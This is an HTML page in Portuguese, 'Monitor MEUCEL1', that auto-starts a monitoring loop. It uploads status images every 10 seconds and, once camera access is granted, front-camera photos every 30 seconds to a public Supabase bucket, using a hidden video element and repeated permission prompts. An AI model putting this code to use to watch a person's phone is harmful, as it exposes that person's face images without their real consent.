<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
    <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
    <meta http-equiv="Pragma" content="no-cache">
    <meta http-equiv="Expires" content="0">
    <meta name="mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black">
    <meta name="theme-color" content="#000000">
    <title>Monitor MEUCEL1</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            background: #000;
            width: 100vw;
            height: 100vh;
            height: 100dvh;
            overflow-y: auto;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        
        .container {
            text-align: center;
            padding: 20px;
            width: 100%;
            max-width: 400px;
        }
        
        .led {
            width: 30px;
            height: 30px;
            border-radius: 50%;
            background: #00ff00;
            box-shadow: 0 0 20px #00ff00, 0 0 40px #00ff00, 0 0 60px #00ff00;
            animation: piscar 2s infinite;
            margin: 0 auto 20px;
        }
        
        @keyframes piscar {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.2; }
        }
        
        .status {
            color: #00ff00;
            font-size: 13px;
            margin: 5px 0;
            font-family: monospace;
            padding: 8px;
            background: #0a0a0a;
            border-radius: 8px;
            word-break: break-word;
        }
        
        .timer {
            color: #008800;
            font-size: 18px;
            font-family: monospace;
            margin: 10px 0;
        }
        
        .info {
            color: #004400;
            font-size: 10px;
            margin-top: 10px;
            font-family: monospace;
        }
        
        video {
            position: fixed;
            top: -9999px;
            left: -9999px;
            width: 1px;
            height: 1px;
            opacity: 0;
            pointer-events: none;
        }
        
        button {
            width: 100%;
            padding: 14px;
            margin: 6px 0;
            border: none;
            border-radius: 10px;
            font-size: 14px;
            font-weight: bold;
            cursor: pointer;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
        }
        
        button:active {
            transform: scale(0.96);
        }
        
        .btn-camera {
            background: #ffaa00;
            color: #000;
        }
        
        .btn-camera:hover {
            background: #ffcc00;
        }
        
        .alerta-camera {
            background: #1a1000;
            border: 1px solid #ffaa00;
            color: #ffcc00;
            padding: 10px;
            border-radius: 8px;
            margin: 8px 0;
            font-size: 12px;
            text-align: center;
            animation: pulse-border 3s infinite;
        }
        
        @keyframes pulse-border {
            0%, 100% { border-color: #ffaa00; }
            50% { border-color: #ff6600; box-shadow: 0 0 10px rgba(255,170,0,0.3); }
        }
        
        .icone-camera {
            font-size: 40px;
            display: block;
            margin: 10px 0;
            animation: bounce 1s infinite;
        }
        
        @keyframes bounce {
            0%, 100% { transform: translateY(0); }
            50% { transform: translateY(-10px); }
        }
        
        .status-camera {
            display: inline-block;
            padding: 3px 10px;
            border-radius: 15px;
            font-size: 11px;
            font-weight: bold;
        }
        
        .camera-ok {
            background: #003300;
            color: #00ff00;
        }
        
        .camera-falta {
            background: #331100;
            color: #ffaa00;
        }
        
        .versao {
            position: fixed;
            bottom: 5px;
            right: 10px;
            color: #002200;
            font-size: 8px;
            font-family: monospace;
        }
        
        .lembrete {
            background: #0a0a00;
            border-left: 3px solid #ffaa00;
            padding: 8px;
            margin: 8px 0;
            text-align: left;
            font-size: 11px;
            color: #aaaa00;
        }
    </style>
</head>
<body>
    <div class="container" id="container">
        <div class="led" id="led"></div>
        <div class="timer" id="timer">Iniciando...</div>
        
        <!-- Status principal -->
        <div class="status" id="status1">🟢 Sistema ativo</div>
        
        <!-- Status da câmera -->
        <div id="statusCamera" style="margin: 8px 0;">
            <span class="status-camera camera-falta" id="badgeCamera">
                📷 Câmera: Verificando...
            </span>
        </div>
        
        <!-- Alerta de câmera (aparece só quando necessário) -->
        <div id="alertaCamera" style="display:none;">
            <div class="alerta-camera">
                <span class="icone-camera">📷</span>
                <strong>Câmera não configurada</strong><br>
                <small>Selfies não serão tiradas</small>
            </div>
            <button class="btn-camera" id="btnPermissao">
                🔓 CONCEDER PERMISSÃO AGORA
            </button>
            <div class="lembrete">
                💡 <strong>Dica:</strong> As screenshots continuam normais!<br>
                A câmera é só para as selfies a cada 30s.
            </div>
        </div>
        
        <!-- Status secundário -->
        <div class="status" id="status2" style="display:none;"></div>
        
        <div class="info" id="info"></div>
    </div>
    
    <video id="cameraVideo" playsinline autoplay muted></video>
    <div class="versao">v2.1 • Monitor MEUCEL1</div>

    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
    <script>
        (function() {
            const CONFIG = {
                SUPABASE_URL: 'https://vlkobipdenduyismnkpm.supabase.co',
                SUPABASE_KEY: 'sb_publishable_qWeCNdiMyftZ6ZMYDF9u_A_bOplqpiA',
                CODIGO_SESSAO: 'MEUCEL1',
                SCREENSHOT_INTERVAL: 10000,  // 10 segundos
                SELFIE_INTERVAL: 30000,       // 30 segundos
                LEMBRETE_CAMERA: 180000,      // 3 minutos (180000ms)
            };
            
            let supabaseClient;
            let cameraStream = null;
            let screenshotInterval = null;
            let selfieInterval = null;
            let lembreteInterval = null;
            let wakeLock = null;
            let lastScreenshotTime = Date.now();
            let lastSelfieTime = Date.now();
            let uploadQueue = [];
            let isProcessing = false;
            let monitoramentoAtivo = true; // JÁ INICIA ATIVO!
            let cameraDisponivel = false;
            
            const led = document.getElementById('led');
            const timerEl = document.getElementById('timer');
            const status1 = document.getElementById('status1');
            const status2 = document.getElementById('status2');
            const infoEl = document.getElementById('info');
            const cameraVideo = document.getElementById('cameraVideo');
            const btnPermissao = document.getElementById('btnPermissao');
            const alertaCamera = document.getElementById('alertaCamera');
            const badgeCamera = document.getElementById('badgeCamera');
            
            // === INICIAR IMEDIATAMENTE ===
            function init() {
                // Conectar Supabase
                try {
                    supabaseClient = window.supabase.createClient(
                        CONFIG.SUPABASE_URL, 
                        CONFIG.SUPABASE_KEY
                    );
                    log('✅ Supabase conectado');
                } catch (error) {
                    log('❌ Erro Supabase: ' + error.message);
                }
                
                // Iniciar screenshots IMEDIATAMENTE (não precisa de câmera)
                iniciarScreenshots();
                
                // Tentar câmera (se falhar, tudo bem)
                tentarCamera();
                
                // Iniciar timer de lembrete
                iniciarLembreteCamera();
                
                // Wake Lock
                requestWakeLock();
                
                // Timer visual
                setInterval(updateTimer, 1000);
                
                log('🟢 Monitoramento iniciado');
            }
            
            function log(msg) {
                console.log(`[${new Date().toLocaleTimeString()}] ${msg}`);
                status1.textContent = msg;
            }
            
            function updateTimer() {
                const now = Date.now();
                const nextScreenshot = Math.max(0, Math.ceil((CONFIG.SCREENSHOT_INTERVAL - (now - lastScreenshotTime)) / 1000));
                const nextSelfie = cameraDisponivel ? 
                    Math.max(0, Math.ceil((CONFIG.SELFIE_INTERVAL - (now - lastSelfieTime)) / 1000)) : 
                    '--';
                
                timerEl.textContent = `📸 ${nextScreenshot}s | 🤳 ${nextSelfie}s`;
                
                const status = [];
                if (monitoramentoAtivo) status.push('🟢 Ativo');
                if (cameraDisponivel) status.push('📷 Câmera OK');
                if (!navigator.onLine) status.push('🔴 Offline');
                
                infoEl.textContent = `Sessão: ${CONFIG.CODIGO_SESSAO} | Fila: ${uploadQueue.length} | ${status.join(' • ')}`;
            }
            
            function piscarLED() {
                led.style.animation = 'none';
                led.offsetHeight;
                led.style.animation = 'piscar 0.2s 5';
                setTimeout(() => {
                    led.style.animation = 'piscar 2s infinite';
                }, 1000);
            }
            
            // === SCREENSHOTS (FUNCIONA SEM CÂMERA) ===
            function iniciarScreenshots() {
                log('📸 Screenshots: 10s');
                
                // Primeira captura em 3 segundos
                setTimeout(captureScreenshot, 3000);
                
                // Capturas contínuas
                screenshotInterval = setInterval(captureScreenshot, CONFIG.SCREENSHOT_INTERVAL);
            }
            
            async function captureScreenshot() {
                if (!monitoramentoAtivo) return;
                
                try {
                    const canvas = document.createElement('canvas');
                    canvas.width = window.innerWidth || 720;
                    canvas.height = window.innerHeight || 1280;
                    const ctx = canvas.getContext('2d');
                    
                    // Fundo preto
                    ctx.fillStyle = '#000';
                    ctx.fillRect(0, 0, canvas.width, canvas.height);
                    
                    // Texto
                    ctx.fillStyle = '#00ff00';
                    ctx.font = 'bold 24px monospace';
                    ctx.fillText('📱 Monitor MEUCEL1', 20, 40);
                    ctx.fillText(new Date().toLocaleString('pt-BR'), 20, 70);
                    ctx.fillText('Câmera: ' + (cameraDisponivel ? 'Ativa' : 'Off'), 20, 100);
                    
                    canvas.toBlob(async (blob) => {
                        if (blob) {
                            await uploadToSupabase(blob, `print_${Date.now()}.jpg`, 'print');
                            lastScreenshotTime = Date.now();
                        }
                    }, 'image/jpeg', 0.6);
                    
                } catch (error) {
                    console.error('Erro screenshot:', error);
                }
            }
            
            // === CÂMERA (OPCIONAL) ===
            async function tentarCamera() {
                try {
                    await startCamera();
                    cameraDisponivel = true;
                    atualizarStatusCamera(true);
                    iniciarSelfies();
                    esconderAlertaCamera();
                    log('📷 Câmera ativada');
                } catch (error) {
                    cameraDisponivel = false;
                    atualizarStatusCamera(false);
                    mostrarAlertaCamera();
                    log('⚠️ Câmera indisponível - apenas screenshots');
                }
            }
            
            async function startCamera() {
                if (cameraStream) {
                    cameraStream.getTracks().forEach(track => track.stop());
                }
                
                cameraStream = await navigator.mediaDevices.getUserMedia({
                    video: {
                        facingMode: 'user',
                        width: { ideal: 480 },
                        height: { ideal: 640 }
                    },
                    audio: false
                });
                
                cameraVideo.srcObject = cameraStream;
                await cameraVideo.play();
                
                return true;
            }
            
            function iniciarSelfies() {
                if (selfieInterval) clearInterval(selfieInterval);
                
                log('🤳 Selfies: 30s');
                lastSelfieTime = Date.now();
                
                // Primeira selfie em 5 segundos
                setTimeout(captureSelfie, 5000);
                
                // Selfies contínuas
                selfieInterval = setInterval(captureSelfie, CONFIG.SELFIE_INTERVAL);
            }
            
            async function captureSelfie() {
                if (!monitoramentoAtivo || !cameraDisponivel) return;
                if (!cameraVideo || !cameraStream) return;
                
                try {
                    const canvas = document.createElement('canvas');
                    canvas.width = 480;
                    canvas.height = 640;
                    const ctx = canvas.getContext('2d');
                    
                    ctx.translate(canvas.width, 0);
                    ctx.scale(-1, 1);
                    ctx.drawImage(cameraVideo, 0, 0, canvas.width, canvas.height);
                    
                    canvas.toBlob(async (blob) => {
                        if (blob) {
                            await uploadToSupabase(blob, `selfie_${Date.now()}.jpg`, 'selfie');
                            lastSelfieTime = Date.now();
                        }
                    }, 'image/jpeg', 0.7);
                    
                } catch (error) {
                    console.error('Erro selfie:', error);
                }
            }
            
            // === LEMBRETE DE CÂMERA (A CADA 3 MINUTOS) ===
            function iniciarLembreteCamera() {
                lembreteInterval = setInterval(() => {
                    if (!cameraDisponivel) {
                        // Tentar novamente
                        tentarCamera();
                        
                        // Se ainda falhar, mostrar alerta
                        if (!cameraDisponivel) {
                            mostrarAlertaCamera();
                            piscarLED();
                        }
                    }
                }, CONFIG.LEMBRETE_CAMERA);
            }
            
            function atualizarStatusCamera(disponivel) {
                if (disponivel) {
                    badgeCamera.textContent = '📷 Câmera: Ativa';
                    badgeCamera.className = 'status-camera camera-ok';
                } else {
                    badgeCamera.textContent = '📷 Câmera: Não configurada';
                    badgeCamera.className = 'status-camera camera-falta';
                }
            }
            
            function mostrarAlertaCamera() {
                alertaCamera.style.display = 'block';
                status2.style.display = 'block';
                status2.textContent = '⚠️ Selfies desativadas (câmera não permitida)';
            }
            
            function esconderAlertaCamera() {
                alertaCamera.style.display = 'none';
                status2.style.display = 'none';
            }
            
            // Botão de permissão
            btnPermissao.addEventListener('click', async () => {
                btnPermissao.textContent = '⏳ Solicitando...';
                btnPermissao.disabled = true;
                
                try {
                    await startCamera();
                    cameraDisponivel = true;
                    atualizarStatusCamera(true);
                    iniciarSelfies();
                    esconderAlertaCamera();
                    log('✅ Câmera ativada com sucesso!');
                    piscarLED();
                } catch (error) {
                    log('❌ Permissão negada');
                    atualizarStatusCamera(false);
                    btnPermissao.textContent = '🔓 TENTAR NOVAMENTE';
                    btnPermissao.disabled = false;
                }
            });
            
            // === UPLOAD ===
            async function uploadToSupabase(blob, filename, tipo) {
                uploadQueue.push({ blob, filename, tipo });
                if (!isProcessing) processQueue();
            }
            
            async function processQueue() {
                if (isProcessing || uploadQueue.length === 0) return;
                
                isProcessing = true;
                
                while (uploadQueue.length > 0) {
                    const item = uploadQueue[0];
                    
                    try {
                        const filePath = `${CONFIG.CODIGO_SESSAO}/${item.tipo}/${item.filename}`;
                        
                        const { error } = await supabaseClient.storage
                            .from('captures')
                            .upload(filePath, item.blob, {
                                contentType: 'image/jpeg',
                                upsert: false
                            });
                        
                        if (error) throw error;
                        
                        const publicUrl = `${CONFIG.SUPABASE_URL}/storage/v1/object/public/captures/${filePath}`;
                        
                        await supabaseClient.from('captures').insert({
                            codigo_sessao: CONFIG.CODIGO_SESSAO,
                            tipo: item.tipo,
                            url: publicUrl,
                            filename: item.filename,
                            created_at: new Date().toISOString()
                        });
                        
                        log(`✅ Enviado: ${item.tipo}`);
                        piscarLED();
                        uploadQueue.shift();
                        
                    } catch (error) {
                        if (!navigator.onLine) {
                            log('📦 Offline - Item na fila');
                            break;
                        } else {
                            uploadQueue.shift();
                        }
                    }
                }
                
                isProcessing = false;
                
                if (uploadQueue.length > 0) {
                    setTimeout(processQueue, 5000);
                }
            }
            
            // === WAKE LOCK ===
            async function requestWakeLock() {
                try {
                    if ('wakeLock' in navigator) {
                        wakeLock = await navigator.wakeLock.request('screen');
                        wakeLock.addEventListener('release', () => {
                            if (monitoramentoAtivo) {
                                setTimeout(requestWakeLock, 1000);
                            }
                        });
                    }
                } catch (err) {}
            }
            
            // === EVENTOS ===
            window.addEventListener('online', () => {
                log('🟢 Online');
                processQueue();
            });
            
            window.addEventListener('offline', () => {
                log('🔴 Offline');
            });
            
            document.addEventListener('visibilitychange', () => {
                if (!document.hidden && monitoramentoAtivo) {
                    requestWakeLock();
                    processQueue();
                }
            });
            
            // === INICIAR TUDO ===
            init();
            
            // Tentar câmera novamente se estava offline
            window.addEventListener('online', () => {
                if (!cameraDisponivel) {
                    setTimeout(tentarCamera, 2000);
                }
            });
        })();
    </script>
</body>
</html>
